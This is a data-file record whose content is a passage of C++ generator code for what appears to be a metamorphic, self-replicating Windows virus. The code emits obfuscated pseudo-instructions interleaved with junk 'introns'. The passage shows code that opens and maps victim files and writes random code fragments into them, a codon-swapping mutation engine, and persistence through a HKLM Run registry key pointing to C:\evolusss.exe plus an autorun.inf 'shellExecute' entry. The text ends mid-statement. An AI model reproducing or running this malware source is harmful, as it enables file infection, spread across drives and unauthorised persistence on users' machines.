id,title,username,language,date,content
file << ""               _push"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
addnumber(""0xC0000000"");
file << ""               _push"" << endl; CreateAnIntron();
GetAddress(""WIN32_FIND_DATA_cFileName"");
file << ""               _push"" << endl; CreateAnIntron();
CallAPI(""hCreateFileA"");

GetAddress(""HGTFileHandle"");
file << ""               _saveWrtOff"" << endl; CreateAnIntron();
file << ""               _nopsA"" << endl; CreateAnIntron();
file << ""               _writeDWord              ; mov dword[HGTFileHandle], RegA"" << endl; CreateAnIntron();

file << ""               _save"" << endl; CreateAnIntron();

file << ""               _nopsA"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""                                       ; -> if error: BC1=0"" << endl; CreateAnIntron();

file << ""               _JnzDown                             ; Simulate a JzDown"" << endl; 
file << ""                       _pop     ; BC1=0"" << endl; 
file << ""                       _push"" << endl; 
file << ""                       _call    ; If INVALID_HANDLE_VALUE -> Do not open..."" << endl; 
file << ""                       _nopREAL"" << endl; 

GetAddress(""HGTFileSize"");

file << ""               _push"" << endl; CreateAnIntron();
zer0(1);
file << ""               _addsaved"" << endl; CreateAnIntron();
file << ""               _push"" << endl; CreateAnIntron();
CallAPI(""hGetFileSize"");

GetAddress(""HGTFileSize"");
file << ""               _saveWrtOff"" << endl; CreateAnIntron();
file << ""               _nopsA"" << endl; CreateAnIntron();
file << ""               _writeDWord              ; mov dword[HGTFileSize], RegA"" << endl; CreateAnIntron();

zer0(1);
file << ""               _push"" << endl; CreateAnIntron();
file << ""               _addsaved"" << endl; CreateAnIntron();
file << ""               _push"" << endl; CreateAnIntron();
zer0(0);
file << ""               _push"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""               _push"" << endl; CreateAnIntron();
zer0(0);
file << ""               _push"" << endl; CreateAnIntron();
GetAddress(""HGTFileHandle"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _push"" << endl; CreateAnIntron();
CallAPI(""hCreateFileMappingA"");


GetAddress(""HGTMapHandle"");

file << ""               _saveWrtOff"" << endl; CreateAnIntron();
file << ""               _nopsA"" << endl; CreateAnIntron();
file << ""               _writeDWord               ; mov dword[HGTMapHandle], RegA"" << endl; CreateAnIntron();

file << ""               _save"" << endl; CreateAnIntron();

file << ""               _nopsA"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();
file << ""               _and"" << endl; CreateAnIntron();
file << ""               _JnzDown                             ; Simulate a JzDown"" << endl; 

file << ""                       _pop     ; BC1=0"" << endl; 
file << ""                       _push"" << endl; 
file << ""                       _call    ; If NULL -> Do not open..."" << endl; 
file << ""                       _nopREAL"" << endl; 

GetAddress(""HGTFileSize"");

file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _push   ; [HGTFileSize]"" << endl; CreateAnIntron();
zer0(1);
file << ""               _push   ; 0"" << endl; CreateAnIntron();
file << ""               _push   ; 0"" << endl; CreateAnIntron();
addnumber(""2"");
file << ""               _push"" << endl; CreateAnIntron();
zer0(1);
file << ""               _addsaved"" << endl; CreateAnIntron();
file << ""               _push   ; MapHandle"" << endl; CreateAnIntron();

CallAPI(""hMapViewOfFile"");

GetAddress(""HGTMapPointer"");

file << ""               _saveWrtOff"" << endl; CreateAnIntron();
file << ""               _nopsA"" << endl; CreateAnIntron();
file << ""               _writeDWord              ; mov dword[HGTMapPointer], RegA"" << endl; CreateAnIntron();

file << ""               _nopsA"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();
file << ""               _and"" << endl; CreateAnIntron();
file << ""               _JnzDown         ; Simulate a JzDown"" << endl; 
file << ""                       _pop     ; BC1=0"" << endl; 
file << ""                       _push"" << endl; 
file << ""                       _call    ; If NULL -> Do not open..."" << endl;
file << ""                       _nopREAL"" << endl;


CalcNewRandNumberAndSaveIt();

GetAddress(""RandomNumber"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _nopdA"" << endl; CreateAnIntron();

zer0(0);
file << ""               _nopdD"" << endl; CreateAnIntron();

GetAddress(""HGTFileSize"");
file << ""               _getdata"" << endl; CreateAnIntron();

file << ""               _div"" << endl; CreateAnIntron();

file << ""               _nopsD"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();

GetAddress(""HGTMapPointer"");
file << ""               _getdata"" << endl; CreateAnIntron();

file << ""               _addsaved"" << endl; CreateAnIntron();

file << ""               _push                ; Start in sourcefile"" << endl; CreateAnIntron();


CalcNewRandNumberAndSaveIt();

GetAddress(""RandomNumber"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _nopdA"" << endl; CreateAnIntron();

zer0(0);
file << ""               _nopdD"" << endl; CreateAnIntron();

GetAddress(""FileSize"");
file << ""               _getdata"" << endl; CreateAnIntron();

file << ""               _div"" << endl; CreateAnIntron();

file << ""               _nopsD"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();

GetAddress(""MapPointer"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _addsaved"" << endl; CreateAnIntron();

file << ""               _push                ; Start in my file"" << endl; CreateAnIntron();


CalcNewRandNumberAndSaveIt();

GetAddress(""RandomNumber"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _nopdA"" << endl; CreateAnIntron();

zer0(0);
file << ""               _nopdD"" << endl; CreateAnIntron();

addnumber(""11"");

file << ""               _div"" << endl; CreateAnIntron();
file << ""               _nopsD"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""               _nopdD"" << endl; CreateAnIntron();

file << ""               ; Size in RegD"" << endl; CreateAnIntron();


file << ""               _pop         ; Start in my file"" << endl; CreateAnIntron();
file << ""               _nopdB"" << endl; CreateAnIntron();


file << ""               _pop         ; Start in victim file"" << endl; CreateAnIntron();
file << ""               _nopdA"" << endl; CreateAnIntron();

file << ""               _pushall"" << endl; CreateAnIntron();
file << ""               _getEIP"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();

file << ""               _saveJmpOff          ; Save everything, especially the old BA2"" << endl; CreateAnIntron();

file << ""                       _nopsB"" << endl; CreateAnIntron();
file << ""                       _saveWrtOff"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""                       _nopdB"" << endl; CreateAnIntron();

file << ""                       _nopsA"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""                       _nopdA"" << endl; CreateAnIntron();
file << ""                       _sub0001"" << endl; CreateAnIntron();
file << ""                       _getdata"" << endl; CreateAnIntron();

file << ""                       _writeByte"" << endl; CreateAnIntron();

file << ""                       _nopsD"" << endl; CreateAnIntron();
file << ""                       _sub0001"" << endl; CreateAnIntron();
file << ""                       _nopdD"" << endl; CreateAnIntron();

file << ""               _JnzUp"" << endl; CreateAnIntron();
file << ""               _popall              ; Get old BA2 again"" << endl; CreateAnIntron();

GetAddress(""HGTDidInsert"");
file << ""               _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
file << ""               _writeDWord"" << endl; CreateAnIntron();


file << ""               _push        ; trash"" << endl; CreateAnIntron();

file << ""        HGTFileEnd1:"" << endl; CreateAnIntron();
file << ""               _pop         ; from call"" << endl; CreateAnIntron();
file << ""               _pop         ; saved address"" << endl; CreateAnIntron();

GetAddress(""HGTMapPointer"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _push"" << endl; CreateAnIntron();
CallAPI(""hUnmapViewOfFile"");


file << ""               _getDO"" << endl; CreateAnIntron();
addnumber(""(hCloseHandle-DataOffset)"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _nopdA       ; Save API in RegA"" << endl; CreateAnIntron();

GetAddress(""HGTMapHandle"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _push"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();
file << ""               _and"" << endl; CreateAnIntron();

file << ""               _JnzDown"" << endl; 
file << ""                  ; BC==0"" << endl; 
file << ""                  _nopREAL"" << endl;
file << ""                  _nopREAL"" << endl;
file << ""                  _add0001"" << endl;
file << ""                  _JnzDown"" << endl;

file << ""                       ; BC!=0"" << endl;
file << ""                       _nopsA       ; get API offset"" << endl;
file << ""                       _call        ; call CloseHandle, dword[HGTMapHandle]"" << endl;
file << ""                       _push        ; Trash"" << endl;
file << ""                       _nopREAL"" << endl;


file << ""               _pop         ; remove trash"" << endl; CreateAnIntron();

file << ""               _getDO"" << endl; CreateAnIntron();
addnumber(""(hCloseHandle-DataOffset)"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _nopdA       ; Save API in RegA"" << endl; CreateAnIntron();

GetAddress(""HGTFileHandle"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _push"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();
file << ""               _and"" << endl; CreateAnIntron();

file << ""               _JnzDown"" << endl;
file << ""                  ; BC==0"" << endl; 
file << ""                  _nopREAL"" << endl; 
file << ""                  _nopREAL"" << endl; 
file << ""                  _add0001"" << endl; 
file << ""                  _JnzDown"" << endl; 

file << ""                       ; BC!=0"" << endl;
file << ""                       _nopsA       ; get API offset"" << endl;
file << ""                       _call        ; call CloseHandle, dword[HGTFileHandle]"" << endl;
file << ""                       _push        ; Trash"" << endl;
file << ""                       _nopREAL"" << endl;

file << ""               _pop         ; remove trash"" << endl; CreateAnIntron();


GetAddress(""HGTDidInsert"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _push                ; 0...written / -1...not written"" << endl; CreateAnIntron();

GetAddress(""WIN32_FIND_DATA_struct"");
file << ""               _push"" << endl; CreateAnIntron();
GetAddress(""HGT_FFHandle"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _push"" << endl; CreateAnIntron();

CallAPI(""hFindNextFileA"");


file << ""               _pop                     ; HGTDidInsert"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();
file << ""               _nopsA                   ; If nonzero: Next file!"" << endl; CreateAnIntron();
file << ""       _and"" << endl; CreateAnIntron();
file << ""       _JnzUp                           ; End of the loop"" << endl; CreateAnIntron();


file << ""       _push                ; Trash to stack"" << endl; CreateAnIntron();
file << ""       HGTEnd1:"" << endl; CreateAnIntron();

file << ""       _pop                 ; Align stack (Trash or Return address from _call)"" << endl; CreateAnIntron();



CalcNewRandNumberAndSaveIt();

GetAddress(""RPAminoAcid1"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();

GetAddress(""RandomNumber"");

file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdA                   ; mov eax, [RandomNumber]"" << endl; CreateAnIntron();


zer0(0);
file << ""       _nopdD                   ; mov edx, 0"" << endl; CreateAnIntron();

addnumber(""256"");

file << ""       _div                     ; div ebx"" << endl; CreateAnIntron();

file << ""       _nopsD                   ; BC1=rand%256"" << endl; CreateAnIntron();

file << ""       _writeDWord              ; Save amino acid to compare."" << endl; CreateAnIntron();


file << ""       _push"" << endl; CreateAnIntron();
zer0(0);
addnumber(""3"");
file << ""       _save"" << endl; CreateAnIntron();

file << ""       _pop"" << endl; CreateAnIntron();
file << ""       _shl                     ; BC1=(rand%256)*8"" << endl; CreateAnIntron();
file << ""       _save"" << endl; CreateAnIntron();


GetAddress(""MapPointer"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _addsaved                ; MapPoint+(rand%256)*8"" << endl; CreateAnIntron();

addnumber(""(CodeStart+(StartAlphabeth-start))"");
file << ""       _push"" << endl; CreateAnIntron();
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdA                   ; First 4 bytes of amino acid in RegA"" << endl; CreateAnIntron();

file << ""       _pop"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdB                   ; 2nd 4 bytes of amino acid in RegB"" << endl; CreateAnIntron();

GetAddress(""MapPointer"");
file << ""       _getdata"" << endl; CreateAnIntron();

addnumber(""(CodeStart+(StartAlphabeth-start))"");
file << ""       _nopdD"" << endl; CreateAnIntron();


file << ""    ; Start of loop:"" << endl; CreateAnIntron();
file << ""       _getEIP"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _saveJmpOff"" << endl; CreateAnIntron();

zer0(0);
addnumber(""((RPBlock1End1-RPBlock1Start1)*8)"");
file << ""               _save"" << endl; CreateAnIntron();

file << ""               _getEIP"" << endl; CreateAnIntron();

file << ""           RPBlock1Start1:"" << endl; CreateAnIntron();
addnumber(""3"");
file << ""               _addsaved"" << endl; CreateAnIntron();
file << ""               _push                               ; Save Addresse at Stack"" << endl; CreateAnIntron();


file << ""               _pushall"" << endl; CreateAnIntron();
CalcNewRandNumberAndSaveIt();

GetAddress(""RPAminoAcid2"");
file << ""                       _saveWrtOff"" << endl; CreateAnIntron();

GetAddress(""RandomNumber"");

file << ""                       _getdata"" << endl; CreateAnIntron();
file << ""                       _nopdA                   ; mov eax, [RandomNumber]"" << endl; CreateAnIntron();

zer0(0);
file << ""                       _nopdD                   ; mov edx, 0"" << endl; CreateAnIntron();

addnumber(""256"");

file << ""                       _div                     ; div ebx"" << endl; CreateAnIntron();

file << ""                       _nopsD"" << endl; CreateAnIntron();
file << ""                       _writeDWord"" << endl; CreateAnIntron();

file << ""               _popall"" << endl; CreateAnIntron();

file << ""               _pushall"" << endl; CreateAnIntron();
GetAddress(""RPAminoAcid1"");
file << ""                  _getdata"" << endl; CreateAnIntron();
file << ""                  _nopdA"" << endl; CreateAnIntron();
GetAddress(""RPAminoAcid2"");
file << ""                  _getdata"" << endl; CreateAnIntron();
file << ""                  _nopdB"" << endl; CreateAnIntron();

file << ""               _popall"" << endl; CreateAnIntron();

zer0(0);
addnumber(""3"");
file << ""               _save"" << endl; CreateAnIntron();

GetAddress(""RPAminoAcid2"");
file << ""               _getdata"" << endl; CreateAnIntron();

file << ""               _shl         ; *8"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();

file << ""               _nopsD        ; Get start of Alphabeth in Map"" << endl; CreateAnIntron();

file << ""               _addsaved"" << endl; CreateAnIntron();

file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();

file << ""               _nopsA"" << endl; CreateAnIntron();
subsaved(0);

file << ""               _JnzDown     ; Simulate JzDown"" << endl;

file << ""                       _nopREAL     ; BC1=0"" << endl;
file << ""                       _nopREAL"" << endl;
file << ""                       _add0001"" << endl;
file << ""                       _JnzDown"" << endl;

file << ""                               _nopREAL     ; Not equal"" << endl;
file << ""                               _pop"" << endl;
file << ""                               _push"" << endl;
file << ""                               _call        ; jmp to RPBlock1End"" << endl;

file << ""       ; First 4 bytes are equal"" << endl; CreateAnIntron();
file << ""               _pop         ; Old Call-address"" << endl; CreateAnIntron();

zer0(0);
addnumber(""((RPBlock2End1-RPBlock2Start1)*8)"");
file << ""               _save"" << endl; CreateAnIntron();

file << ""               _getEIP"" << endl; CreateAnIntron();

file << ""           RPBlock2Start1:"" << endl; CreateAnIntron();
addnumber(""3"");
file << ""               _addsaved"" << endl; CreateAnIntron();
file << ""               _push                               ; Save Addresse at Stack"" << endl; CreateAnIntron();


zer0(0);
addnumber(""3"");
file << ""               _save"" << endl; CreateAnIntron();

GetAddress(""RPAminoAcid2"");
file << ""               _getdata"" << endl; CreateAnIntron();

file << ""               _shl         ; *8"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();

file << ""               _nopsD        ; Get start of Alphabeth in Map"" << endl; CreateAnIntron();

file << ""               _addsaved"" << endl; CreateAnIntron();

addnumber(""4"");

file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();

file << ""               _nopsB       ; second 4 bytes"" << endl; CreateAnIntron();
subsaved(0);
file << ""               _JnzDown"" << endl;

file << ""                       _nopREAL     ; BC1=0"" << endl;
file << ""                       _pop"" << endl;
file << ""                       _push"" << endl;
file << ""                       _call        ; RPBlock2End"" << endl;

file << ""               _push        ; not equal! trash to stack"" << endl; CreateAnIntron();

file << ""           RPBlock1End1:        ; Not equal amino acids"" << endl; CreateAnIntron();
file << ""               _pop         ; remove "" << static_cast<char>(34) << ""call"" << static_cast<char>(34) << ""-return address"" << endl; CreateAnIntron();
file << ""               _pop         ; RPBlock1End-Jmp Address"" << endl; CreateAnIntron();

zer0(0);
addnumber(""15"");
file << ""               _save"" << endl; CreateAnIntron();

GetAddress(""RandomNumber"");
file << ""               _getdata     ; BC1=random"" << endl; CreateAnIntron();

file << ""               _shr         ; BC1=random >> 15 (to get new small random number without calling the 32bit RND engine again)"" << endl; CreateAnIntron();
file << ""               _and         ; BC1=(random >> 15) % 0000 1111b"" << endl; CreateAnIntron();
file << ""       _JnzUp               ; If not zero -> Next loop!"" << endl; CreateAnIntron();


file << ""       ; Not found any equivalences..."" << endl; CreateAnIntron();

zer0(0);
addnumber(""((RPBlock3End1-RPBlock3Start1)*8)"");
file << ""       _save"" << endl; CreateAnIntron();

file << ""       _getEIP"" << endl; CreateAnIntron();

file << ""     RPBlock3Start1:"" << endl; CreateAnIntron();
addnumber(""3"");
file << ""       _addsaved"" << endl; CreateAnIntron();

file << ""       _call        ; jmp to end of poly-engine: RPBlock3End"" << endl; CreateAnIntron();




file << ""     RPBlock2End1:      ; Equal amino acids found"" << endl; CreateAnIntron();
file << ""       _pop         ; remove "" << static_cast<char>(34) << ""call"" << static_cast<char>(34) << ""-return address"" << endl; CreateAnIntron();
file << ""       _pop         ; RPBlock2End-Jmp Address"" << endl; CreateAnIntron();


GetAddress(""MapPointer"");
file << ""       _getdata"" << endl; CreateAnIntron();

addnumber(""(CodeStart+(StAmino-start))"");
file << ""       _nopdD"" << endl; CreateAnIntron();

GetAddress(""RPAminoAcid1"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdA"" << endl; CreateAnIntron();

GetAddress(""RPAminoAcid2"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdB"" << endl; CreateAnIntron();

zer0(0);
GetAddress(""FileSize"");
file << ""       _getdata"" << endl; CreateAnIntron();
addnumber(""(0xFFFFFFFF-(CodeStart+(StAmino-start))-1000)"");
file << ""       _push"" << endl; CreateAnIntron();

file << ""       _getEIP"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _saveJmpOff"" << endl; CreateAnIntron();

file << ""               _nopsD       ; Codon-Sequence Start"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();

file << ""               _pop"" << endl; CreateAnIntron();
file << ""               _push        ; counter"" << endl; CreateAnIntron();

file << ""               _addsaved"" << endl; CreateAnIntron();
file << ""               _saveWrtOff"" << endl; CreateAnIntron();
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _push"" << endl; CreateAnIntron();

zer0(0);
addnumber(""255"");
file << ""               _save"" << endl; CreateAnIntron();
file << ""               _pop"" << endl; CreateAnIntron();
file << ""               _and         ; BC1=one byte"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();

file << ""               _nopsA"" << endl; CreateAnIntron();

subsaved(0);
file << ""               _JnzDown"" << endl;
file << ""                       _nopsB"" << endl;
file << ""                       _writeByte           ; If equal: exchange codon!"" << endl;
file << ""                       _nopREAL"" << endl;
file << ""                       _nopREAL"" << endl;

file << ""               _pushall"" << endl; CreateAnIntron();
CalcNewRandNumberAndSaveIt();
file << ""               _popall"" << endl; CreateAnIntron();

zer0(0);
addnumber(""1"");
file << ""               _save"" << endl; CreateAnIntron();

GetAddress(""RandomNumber"");
file << ""               _getdata"" << endl; CreateAnIntron();
file << ""               _and"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""               _save                ; BC2=(rand%8)+1"" << endl; CreateAnIntron();

file << ""               _pop"" << endl; CreateAnIntron();
subsaved(0);
file << ""               _push"" << endl; CreateAnIntron();

zer0(0);
addnumber(""4293918720"");
file << ""               _save"" << endl; CreateAnIntron();
file << ""               _pop"" << endl; CreateAnIntron();
file << ""               _push"" << endl; CreateAnIntron();
file << ""               _and                 ; BC1=(counter%0xFFF0 0000)"" << endl; CreateAnIntron();

file << ""               _JnzDown"" << endl;
file << ""                       _add0001  ; Not finished"" << endl;
file << ""                       _JnzUp       ; Next step"" << endl;
file << ""                       _nopREAL"" << endl;
file << ""                       _nopREAL"" << endl;


file << ""       _pop         ; counter away from stack"" << endl; CreateAnIntron();
file << ""       _push        ; trash"" << endl; CreateAnIntron();

file << ""     RPBlock3End1:"" << endl; CreateAnIntron();
file << ""       _pop         ; return value from call"" << endl; CreateAnIntron();


GetAddress(""MapPointer"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _push"" << endl; CreateAnIntron();
CallAPI(""hUnmapViewOfFile"");

GetAddress(""MapHandle"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _push"" << endl; CreateAnIntron();
CallAPI(""hCloseHandle"");

GetAddress(""FileHandle"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _push"" << endl; CreateAnIntron();
CallAPI(""hCloseHandle"");


GetAddress(""AutoStartContentStart"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
file << ""       _nopdA"" << endl; CreateAnIntron();

GetAddress(""stSubKey"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'SOFT\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'WARE\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'\\Mic\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'roso\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'ft\\W\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'indo\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'ws\\C\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'urre\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'ntVe\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'rsio\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'n\\Ru\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'n\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();


GetAddress(""hRegKey"");
file << ""       _push"" << endl; CreateAnIntron();
GetAddress(""stSubKey"");
file << ""       _push"" << endl; CreateAnIntron();
zer0(0);
addnumber(""HKEY_LOCAL_MACHINE"");
file << ""       _push"" << endl; CreateAnIntron();
CallAPI(""hRegCreateKeyA"");

zer0(0);
addnumber(""15"");
file << ""       _push                ; 15"" << endl; CreateAnIntron();
GetAddress(""Driveletter3"");
file << ""       _push                ; C:"" << static_cast<char>(92) << ""evolusss.exe"" << endl; CreateAnIntron();
zer0(0);
addnumber(""REG_SZ"");
file << ""       _push                ; REG_SZ"" << endl; CreateAnIntron();
zer0(0);
file << ""       _push                ; 0x0"" << endl; CreateAnIntron();
file << ""       _push                ; 0x0"" << endl; CreateAnIntron();
GetAddress(""hRegKey"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _push                ; dword[hRegKey]"" << endl; CreateAnIntron();
CallAPI(""hRegSetValueExA"");

GetAddress(""AutoStartContentStart"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'[Aut\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'orun\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x530A0D5D"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'hell\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'Exec\'"");
